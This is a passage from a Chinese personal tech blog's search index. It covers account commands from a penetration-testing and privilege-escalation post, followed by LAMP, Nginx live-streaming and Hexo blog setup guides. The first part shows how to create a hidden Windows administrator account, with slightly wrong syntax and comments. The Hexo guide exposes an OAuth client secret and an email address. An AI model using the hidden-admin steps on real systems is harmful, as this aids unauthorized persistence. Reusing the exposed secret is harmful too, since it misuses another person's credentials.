<h2 id="注！非交互式shell修改密码"><a href="#注！非交互式shell修改密码" class="headerlink" title="注！非交互式shell修改密码"></a>注！非交互式shell修改密码</h2><pre class="highlight"><span class="line">echo &quot;test:123&quot; | chpasswd</span><br><span class="line"></span><br><span class="line">echo &quot;123&quot; | passwd --stdin &quot;test&quot;</span><br></pre>



<h1 id="Windows环境"><a href="#Windows环境" class="headerlink" title="Windows环境"></a>Windows环境</h1><h2 id="1、创建普通用户-1"><a href="#1、创建普通用户-1" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">net user test 123456 /add		#添加test用户，密码为12356</span><br><span class="line">net user $test 123456 /add		#添加隐藏test用户，密码为12356</span><br></pre>



<h2 id="2、添加用户至管理员组"><a href="#2、添加用户至管理员组" class="headerlink" title="2、添加用户至管理员组"></a>2、添加用户至管理员组</h2><pre class="highlight"><span class="line">net localgroup administrators test /add		#添加test用户至管理员组</span><br></pre>



<p>查看管理员组成员</p>
<pre class="highlight"><span class="line">net localgroup administrators		#查看管理员组成员</span><br></pre>



<p>删除用户</p>
<pre class="highlight"><span class="line">net localgroup administrators test /del		#删除用户</span><br></pre>



<p>禁用用户/启用用户</p>
<pre class="highlight"><span class="line">net user test /active:no		#禁用test用户</span><br><span class="line">net user test /active:yes		#启用test用户</span><br></pre>

]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>添加用户</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建LAMP环境</title>
    <url>/article/a964a121.html</url>
    <content><![CDATA[<h1 id="LAMP："><a href="#LAMP：" class="headerlink" title="LAMP："></a>LAMP：</h1><p>Linux+Apache+Mysql+PHP</p>
<h1 id="1、安装Apache（httpd）"><a href="#1、安装Apache（httpd）" class="headerlink" title="1、安装Apache（httpd）"></a>1、安装Apache（httpd）</h1><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>

<h1 id="2、启动apache并设置开机自启"><a href="#2、启动apache并设置开机自启" class="headerlink" title="2、启动apache并设置开机自启"></a>2、启动apache并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start httpd		#开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd		#查看apache状态</span><br></pre>



<h1 id="3、安装Mysql"><a href="#3、安装Mysql" class="headerlink" title="3、安装Mysql"></a>3、安装Mysql</h1><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>



<h1 id="4、启动Mysql并设置开机自启"><a href="#4、启动Mysql并设置开机自启" class="headerlink" title="4、启动Mysql并设置开机自启"></a>4、启动Mysql并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start mariadb			#开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb		#查看mariadb状态</span><br></pre>



<h1 id="5、配置Mysql数据库"><a href="#5、配置Mysql数据库" class="headerlink" title="5、配置Mysql数据库"></a>5、配置Mysql数据库</h1><pre class="highlight"><span class="line">mysql_secure_installation		#初始化mysql数据库（全部回车确认）</span><br></pre>

<p>设置mysql密码（非操作系统密码）</p>
<h1 id="6、安装PHP"><a href="#6、安装PHP" class="headerlink" title="6、安装PHP"></a>6、安装PHP</h1><p>(php-fpm php-mysqlnd不装，其他均可)</p>
<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>

<h1 id="7、重启apache使php生效"><a href="#7、重启apache使php生效" class="headerlink" title="7、重启apache使php生效"></a>7、重启apache使php生效</h1><p>（php不是独立软件，依附apache）</p>
<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>

<h1 id="8、解压WP网站"><a href="#8、解压WP网站" class="headerlink" title="8、解压WP网站"></a>8、解压WP网站</h1><h1 id="9、复制WP网站文件至Apache网站目录"><a href="#9、复制WP网站文件至Apache网站目录" class="headerlink" title="9、复制WP网站文件至Apache网站目录"></a>9、复制WP网站文件至Apache网站目录</h1><pre class="highlight"><span class="line">cp -r WP/* /var/www/html</span><br></pre>

<h1 id="10、赋予Apache网站apache权限"><a href="#10、赋予Apache网站apache权限" class="headerlink" title="10、赋予Apache网站apache权限"></a>10、赋予Apache网站apache权限</h1><p>（apache服务由apache账户运行，还权限，安全控制）</p>
<pre class="highlight"><span class="line">chown -R apache:apache /var/www/html</span><br></pre>

<h1 id="11、禁用SELinux"><a href="#11、禁用SELinux" class="headerlink" title="11、禁用SELinux"></a>11、禁用SELinux</h1><p>（安全访问控制，影响网站访问）</p>
<pre class="highlight"><span class="line">vi /etc/sysconfig/selinux</span><br><span class="line"></span><br><span class="line">修改SELINUX=disabled</span><br><span class="line">重启操作系统（reboot）</span><br></pre>



<h1 id="12、访问网站ip-80端口，安装wp网站"><a href="#12、访问网站ip-80端口，安装wp网站" class="headerlink" title="12、访问网站ip+80端口，安装wp网站"></a>12、访问网站ip+80端口，安装wp网站</h1><h1 id="13、此时需要设置mysql账户"><a href="#13、此时需要设置mysql账户" class="headerlink" title="13、此时需要设置mysql账户"></a>13、此时需要设置mysql账户</h1><pre class="highlight"><span class="line">mysql -uroot -p			# 启动mysql（需要输入mysql密码）</span><br><span class="line">create database wp_web;	# 创建mysql账户</span><br><span class="line">exit					# 退出mysql</span><br><span class="line"></span><br></pre>

<p>（注意！wp-config.php  删除可重装wp网站）</p>
<h1 id="14、其他"><a href="#14、其他" class="headerlink" title="14、其他"></a>14、其他</h1><pre class="highlight"><span class="line">/var/www/html					# Apache默认网站路径</span><br><span class="line">/etc/httpd/conf/httpd.conf		# Apache配置文件路径</span><br></pre>

<p>修改DocumentRoot “/var/www”即可修改网站路径</p>
<p> <img src="/article/2.png" alt="2" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/2.png" class="lozad post-image"></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Apache环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建Nginx + 直播推流平台</title>
    <url>/article/f9829b94.html</url>
    <content><![CDATA[<h1 id="搭建Nginx环境"><a href="#搭建Nginx环境" class="headerlink" title="搭建Nginx环境"></a>搭建Nginx环境</h1><h2 id="1、下载Nginx源码包"><a href="#1、下载Nginx源码包" class="headerlink" title="1、下载Nginx源码包"></a>1、下载Nginx源码包</h2><pre class="highlight"><span class="line">curl http://nginx.org/download/nginx-1.20.1.tar.gz -o nginx-1.20.1.tar.gz</span><br></pre>



<h2 id="2、解压源码包"><a href="#2、解压源码包" class="headerlink" title="2、解压源码包"></a>2、解压源码包</h2><pre class="highlight"><span class="line">tar -zxvf nginx-1.20.1.tar.gz -C ../	# -C指定解压路径</span><br></pre>



<h2 id="3、配置生成文件（一般修改配置文件、日志文件路径）"><a href="#3、配置生成文件（一般修改配置文件、日志文件路径）" class="headerlink" title="3、配置生成文件（一般修改配置文件、日志文件路径）"></a>3、配置生成文件（一般修改配置文件、日志文件路径）</h2><pre class="highlight"><span class="line">./configure --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/lib/nginx/nginx.pid --with-http_v2_module --with-http_realip_module --with-http_flv_module --with-http_mp4_module --with-http_ssl_module</span><br></pre>

<p>注：需要下载配置环境</p>
<p>如：</p>
<pre class="highlight"><span class="line">yum install pcre-devel zlib-devel openssl-devel</span><br></pre>



<h2 id="4、make编译"><a href="#4、make编译" class="headerlink" title="4、make编译"></a>4、make编译</h2><h2 id="5、make-install安装"><a href="#5、make-install安装" class="headerlink" title="5、make install安装"></a>5、make install安装</h2><h2 id="6、添加nginx到环境变量"><a href="#6、添加nginx到环境变量" class="headerlink" title="6、添加nginx到环境变量"></a>6、添加nginx到环境变量</h2><pre class="highlight"><span class="line">ln -s /usr/local/nginx/sbin/nginx /usr/local/bin/</span><br></pre>

<p>（注！ /usr/local/nginx/sbin/nginx为nginx启动文件的绝对路径）</p>
<p>此时可直接使用nginx命令，如：nginx -s stop停止nginx服务</p>
<h2 id="7、关闭防火墙"><a href="#7、关闭防火墙" class="headerlink" title="7、关闭防火墙"></a>7、关闭防火墙</h2><pre class="highlight"><span class="line">systemctl stop firewalld</span><br><span class="line"></span><br><span class="line">systemctl disable firewalld		#永久禁用</span><br></pre>

<p>至此，访问80端口可看到Nginx测试页</p>
<p> 下载任意html静态网站压缩包，解压并复制到Nginx网站路径，即可访问静态网页</p>
<h2 id="8、其他注意事项"><a href="#8、其他注意事项" class="headerlink" title="8、其他注意事项"></a>8、其他注意事项</h2><pre class="highlight"><span class="line">/var/lib/mysql				# mysql数据路径</span><br><span class="line">/usr/local/nginx/html		# Nginx默认网站路径</span><br><span class="line">/etc/nginx/nginx.conf		# Nginx配置文件</span><br></pre>



<p>修改root /var/www/html即可改变默认路径</p>
<p> <img src="/article/1.png" alt="1" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/1.png" class="lozad post-image"></p>
<h1 id="Nginx搭建直播推流平台"><a href="#Nginx搭建直播推流平台" class="headerlink" title="Nginx搭建直播推流平台"></a>Nginx搭建直播推流平台</h1><h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><p>nginx-http-flv-module-master.zip + OBS Studio（pc端）/杏林推流（app端）</p>
<h2 id="1、源码安装，配置"><a href="#1、源码安装，配置" class="headerlink" title="1、源码安装，配置"></a>1、源码安装，配置</h2><p>在nginx源码编译基础上，增加–add-module=/home/chen/software/nginx-http-flv-module-master（导入为绝对路径），即：</p>
<pre class="highlight"><span class="line">./configure --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/lib/nginx/nginx.pid --with-http_v2_module --with-http_realip_module --with-http_flv_module --with-http_mp4_module --with-http_ssl_module --add-module=/home/chen/software/nginx-http-flv-module-master</span><br></pre>



<h2 id="2、make、make-install"><a href="#2、make、make-install" class="headerlink" title="2、make、make install"></a>2、make、make install</h2><h2 id="3、修改配置文件"><a href="#3、修改配置文件" class="headerlink" title="3、修改配置文件"></a>3、修改配置文件</h2><p>（/etc/nginx/nginx.conf）</p>
<p>在http中新增（与最内层函数同级）</p>
<pre class="highlight"><span class="line">location /live &#123;</span><br><span class="line"></span><br><span class="line">  flv_live on;</span><br><span class="line"></span><br><span class="line">  chunked_transfer_encoding on;</span><br><span class="line"></span><br><span class="line">  add_header Access-Control-Allow-Origin *;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre>

<p>在文件末尾新增（与http函数同级）</p>
<pre class="highlight"><span class="line">rtmp &#123;</span><br><span class="line"></span><br><span class="line">	server &#123;</span><br><span class="line"></span><br><span class="line">		listen 1935;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">		application chen &#123;</span><br><span class="line"></span><br><span class="line">			live on;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre>

<p>（注！live不可更改，会导致无法加载视频）</p>
<h2 id="4、检查"><a href="#4、检查" class="headerlink" title="4、检查"></a>4、检查</h2><pre class="highlight"><span class="line">nginx -t		# 检测配置文件有无语法错误</span><br><span class="line">nginx -s reload	# 重新加载</span><br></pre>



<h2 id="5、推流设置"><a href="#5、推流设置" class="headerlink" title="5、推流设置"></a>5、推流设置</h2><p>OBS推流设置（PC）</p>
<table>
<thead>
<tr>
<th>说明</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>服务器</td>
<td>rtmp://139.224.x.x/live/</td>
</tr>
<tr>
<td>串流密钥</td>
<td>chen（可更改，类似于密码）</td>
</tr>
</tbody></table>
<p>杏林推流设置（APP）</p>
<pre class="highlight"><span class="line">rtmp://139.224.x.x/live/chen</span><br></pre>



<h2 id="6、观看"><a href="#6、观看" class="headerlink" title="6、观看"></a>6、观看</h2><pre class="highlight"><span class="line">http://bilibili.github.io/flv.js/demo/			#观看视频地址</span><br><span class="line">http://139.224.x.x/live?app=live&amp;stream=chen	#推流视频链接</span><br></pre>

]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Nginx环境搭建</tag>
        <tag>直播推流平台</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建hexo博客</title>
    <url>/article/8e88d59c.html</url>
    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>Github Pages</p>
<p>GitHub Pages 是由 GitHub 官方提供的一种免费的静态站点托管服务，让我们可以在 GitHub 仓库里托管和发布自己的静态网站页面。</p>
<p>Hexo</p>
<p>Hexo 是一个快速、简洁且高效的静态博客框架，它基于 Node.js 运行，可以将我们撰写的 Markdown 文档解析渲染成静态的 HTML 网页。</p>
<h1 id="二、环境准备"><a href="#二、环境准备" class="headerlink" title="二、环境准备"></a>二、环境准备</h1><p>Nodejs + Git + Github账号</p>
<p>（可用choco install nodejs git一键安装）</p>
<h1 id="三、安装"><a href="#三、安装" class="headerlink" title="三、安装"></a>三、安装</h1><h2 id="1、连接github账户"><a href="#1、连接github账户" class="headerlink" title="1、连接github账户"></a>1、连接github账户</h2><table>
<thead>
<tr>
<th>操作</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>设置用户名邮箱</td>
<td>git config –global user.name “zeroChen00”<br>git config –global user.email “<a href="mailto:&#x31;&#54;&#53;&#x32;&#53;&#x36;&#48;&#57;&#x33;&#56;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#x6d;">&#x31;&#54;&#53;&#x32;&#53;&#x36;&#48;&#57;&#x33;&#56;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#x6d;</a>“</td>
</tr>
<tr>
<td>创建SSH密匙</td>
<td>ssh-keygen -t rsa -C “<a href="mailto:&#x31;&#54;&#x35;&#x32;&#53;&#54;&#x30;&#57;&#x33;&#56;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#109;">&#x31;&#54;&#x35;&#x32;&#53;&#54;&#x30;&#57;&#x33;&#56;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#109;</a>“（全部回车）</td>
</tr>
<tr>
<td>添加密匙</td>
<td>1、复制 [C:\Users\用户名.ssh\id_rsa.pub]中密匙<br>2、Github-Setting-SSH and GPG keys-New SSH key，新建Key，贴入密匙</td>
</tr>
<tr>
<td>验证连接</td>
<td>ssh -T <a href="mailto:&#x67;&#x69;&#x74;&#64;&#x67;&#105;&#116;&#x68;&#x75;&#x62;&#46;&#99;&#111;&#109;">&#x67;&#x69;&#x74;&#64;&#x67;&#105;&#116;&#x68;&#x75;&#x62;&#46;&#99;&#111;&#109;</a>（yes确认）<br>显示 “Hi xxx! You’ve successfully……” 即连接成功</td>
</tr>
</tbody></table>
<h2 id="2、创建Github-Pages仓库"><a href="#2、创建Github-Pages仓库" class="headerlink" title="2、创建Github Pages仓库"></a>2、创建Github Pages仓库</h2><p>Github - 加号 - New repository - Repository name 中输入 用户名.github.io - 创建</p>
<p>（注意！仓库用户名需要与github用户名保持一致，否则无法访问）</p>
<h2 id="3、本地安装Hexo博客程序"><a href="#3、本地安装Hexo博客程序" class="headerlink" title="3、本地安装Hexo博客程序"></a>3、本地安装Hexo博客程序</h2><table>
<thead>
<tr>
<th>操作</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>使用npm安装Hexo</td>
<td>npm install  -g hexo-cli</td>
</tr>
<tr>
<td>验证安装</td>
<td>hexo -v</td>
</tr>
<tr>
<td>初始化</td>
<td>hexo init</td>
</tr>
<tr>
<td>安装组件</td>
<td>npm install</td>
</tr>
<tr>
<td>生成页面</td>
<td>hexo g</td>
</tr>
<tr>
<td>启动预览</td>
<td>hexo s</td>
</tr>
<tr>
<td>访问<a href="http://localhost:4000/">http://localhost:4000</a></td>
<td>出现hexo默认界面则安装成功</td>
</tr>
</tbody></table>
<p>（注：hexo server -p 5000可更改端口，默认4000）</p>
<h2 id="4、部署Hexo到Github-Pages"><a href="#4、部署Hexo到Github-Pages" class="headerlink" title="4、部署Hexo到Github Pages"></a>4、部署Hexo到Github Pages</h2><table>
<thead>
<tr>
<th>操作</th>
<th align="left">命令</th>
</tr>
</thead>
<tbody><tr>
<td>安装hexo-deployer-git</td>
<td align="left">npm install  hexo-deployer-git –save</td>
</tr>
<tr>
<td>修改 _config.yml 文件末尾的Deployment 部分</td>
<td align="left">deploy: <br>    type: git<br>    repository: <a href="mailto:&#103;&#105;&#x74;&#x40;&#103;&#105;&#116;&#x68;&#117;&#98;&#x2e;&#x63;&#111;&#x6d;">&#103;&#105;&#x74;&#x40;&#103;&#105;&#116;&#x68;&#117;&#98;&#x2e;&#x63;&#111;&#x6d;</a>:zeroChen00/zeroChen00.github.io.git<br>    branch: maste</td>
</tr>
<tr>
<td>上传部署</td>
<td align="left">hexo d</td>
</tr>
<tr>
<td>访问Giuhub静态博客</td>
<td align="left"><a href="https://zerochen00.github.io/">https://zeroChen00.github.io/</a></td>
</tr>
</tbody></table>
<p>（注意！hexo中所有代码操作，冒号后均要跟一个空格，负责不生效！）</p>
<h1 id="四、主题配置"><a href="#四、主题配置" class="headerlink" title="四、主题配置"></a>四、主题配置</h1><table>
<thead>
<tr>
<th>操作</th>
<th align="left">命令</th>
</tr>
</thead>
<tbody><tr>
<td>下载</td>
<td align="left">git clone <a href="https://github.com/Fechin/hexo-theme-diaspora.git">https://github.com/Fechin/hexo-theme-diaspora.git</a>  themes/diaspora</td>
</tr>
<tr>
<td>修改全局配置文件_config.yml</td>
<td align="left">theme:  diaspora</td>
</tr>
<tr>
<td>新建页面</td>
<td align="left">hexo new  page categories  <br>新增  <br>type:  “categories”</td>
</tr>
<tr>
<td>新建标签</td>
<td align="left">hexo new  page tags  <br>新增  <br>type: “tags”</td>
</tr>
<tr>
<td>安装搜索插件</td>
<td align="left">npm install  hexo-generator-searchdb –save</td>
</tr>
<tr>
<td>修改全局配置文件_config.yml</td>
<td align="left">search:<br>    path: search.xml<br>    field: post<br>    format: html<br>    limit: 10000</td>
</tr>
<tr>
<td>新建页面</td>
<td align="left">hexo new  page search  <br>新增  <br>type:  “search”</td>
</tr>
<tr>
<td>主题配置文件启用全局搜索（已有，勿新增）</td>
<td align="left">#本地搜索,请将索引文件放在网站根目录  <br>local_search:     <br>#是否启用    <br>    enable: true</td>
</tr>
<tr>
<td>开启评论</td>
<td align="left">1、注册OAuth application<br>setting-Developer setting-Oauth Apps-new<br><img src="/article/.%5C%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2.assets%5C20190708182819187.png" alt="20190708182819187" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/.%5C%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2.assets%5C20190708182819187.png" class="lozad post-image"><br>2、修改主题配置文件<br><img src="/article/.%5C%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2.assets%5C20190708184151274-1624155829307.png" alt="20190708184151274" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/.%5C%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2.assets%5C20190708184151274-1624155829307.png" class="lozad post-image"><br>如下：<br>    # Gitalk 评论插件（<a href="https://github.com/gitalk/gitalk%EF%BC%89">https://github.com/gitalk/gitalk）</a><br>    gitalk:<br>        # 是否启用评论功能<br>        enable: true<br>        # 是否自动展开评论框<br>        autoExpand: false<br>        # 应用编号<br>        clientID: ‘e231ce2fa07f8397e8a7’<br>        # 应用秘钥<br>        clientSecret: ‘feb843942f9c476a9b974bb09f0e5135f9ca8f87’<br>        # issue仓库名<br>        repo: ‘zerochen00.github.io’<br>        # Github名<br>        owner: ‘zeroChen00’<br>        # Github名<br>        admin: [‘zeroChen00’]<br>        # Ensure uniqueness and length less than 50<br>        id: location.pathname<br>        # Facebook-like distraction free mode<br>        distractionFreeMode: true<br><br>注意：用户名大小写，评论用户时需要github账户处于登录状态<br></td>
</tr>
</tbody></table>
<h1 id="五、使用"><a href="#五、使用" class="headerlink" title="五、使用"></a>五、使用</h1><table>
<thead>
<tr>
<th>操作</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>1、写博客</td>
<td>hexo new  “My New Post”  source  文件夹中会出现一个 My New Post.md 文件</td>
</tr>
<tr>
<td>或贴入.md文件（需要增加文件头）</td>
<td>—<br>title: Hello World # 标题<br>date: 2019/3/26 hh:mm:ss # 时间<br>categories: # 分类<br>- Diary<br>tags: # 标签<br>- PS3<br>- Games<br>—</td>
</tr>
<tr>
<td>2、更新并发布静态博客</td>
<td>hexo g  # 生成页面  hexo  d  # 部署发布</td>
</tr>
<tr>
<td>3、更改配置</td>
<td>_config.yml文件（修改时:后跟一个空格）</td>
</tr>
<tr>
<td>4、更换主题</td>
<td><a href="https://hexo.io/themes/">https://hexo.io/themes/</a>  git clone  _file ./themes/file  根据主题介绍进行下载并配置_config.yml文件（更改主题名称等）</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>附加</category>
      </categories>
      <tags>
        <tag>hexo博客</tag>
      </tags>
  </entry>
</search>
